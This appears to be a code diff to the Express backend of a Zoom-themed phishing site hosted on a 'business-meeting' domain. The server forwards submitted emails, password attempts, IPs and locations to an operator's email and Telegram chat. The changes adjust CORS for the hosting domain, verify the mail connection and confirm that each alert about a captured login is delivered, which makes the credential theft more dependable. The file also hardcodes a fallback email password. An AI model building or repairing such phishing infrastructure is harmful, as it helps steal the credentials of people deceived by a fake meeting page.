@@ -17,7 +17,7 @@ const app = express();
 const allowedOrigins = [
   'http://localhost:3000',
   'https://your-backblaze-or-cuugmstom-domain.com',
-  'https://business-meeting.vercel.app/'
+  'https://business-meeting.onrender.com' // Removed trailing slash
 ];
 
 const PORT = process.env.PORT || 8080;
@@ -31,9 +31,16 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 app.use(cors({
   origin: function (origin, callback) {
-    if (!origin || allowedOrigins.includes(origin)) {
+    // allow requests with no origin (like mobile apps or curl requests)
+    if (!origin) return callback(null, true);
+    
+    // Normalize origin by removing trailing slash if present
+    const normalizedOrigin = origin.replace(/\/$/, "");
+    
+    if (allowedOrigins.includes(normalizedOrigin)) {
       callback(null, true);
     } else {
+      console.warn(`CORS blocked for origin: ${origin}`);
       callback(new Error('CORS blocked'));
     }
   },
@@ -49,6 +56,17 @@ const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD || "de23#$QZoom2026!";
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: { user: smtpUser, pass: smtpPass }
+});
+
+// Verify SMTP connection on startup
+transporter.verify((error, success) => {
+  if (error) {
+    console.error("❌ SMTP Verification Error:", error);
+    console.error("Ensure SMTP_USER and SMTP_PASS are set correctly in Render environment variables.");
+    console.error("If using Gmail, use an 'App Password' instead of your main password.");
+  } else {
+    console.log("✅ Mail Server is ready to send messages");
+  }
 });
 
 function getClientIp(req) {
@@ -119,7 +137,11 @@ ${logData.intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
       to: adminEmail,
       subject: `🚨 Zoom Meeting ${String(logData.action || '').toUpperCase()} from ${locationInfo}${logData.intruderDetected ? ' [INTRUDER!]' : ''}`,
       text: alertMailText
-    }).catch(console.error);
+    }).then(info => {
+      console.log(`✅ Email sent for action: ${logData.action}`);
+    }).catch(err => {
+      console.error(`❌ Failed to send email for action: ${logData.action}`, err);
+    });
 
     // Telegram alert
     const tgText = `Zoom Action: ${logData.action} | Email: ${logData.email || 'none'} | IP: ${ip}`;
@@ -152,7 +174,11 @@ Time: ${new Date().toISOString()}`;
     to: adminEmail,
     subject: `🔐 Zoom Email Password Attempt (${email})`,
     text: alertMailText
-  }).catch(console.error);
+  }).then(info => {
+    console.log(`✅ Authentication attempt email sent for: ${email}`);
+  }).catch(err => {
+    console.error(`❌ Failed to send authentication email for: ${email}`, err);
+  });
 
   const tgText = `Zoom Login Attempt: email=${email} ip=${ip}`;
   sendTelegramAlert(tgText);
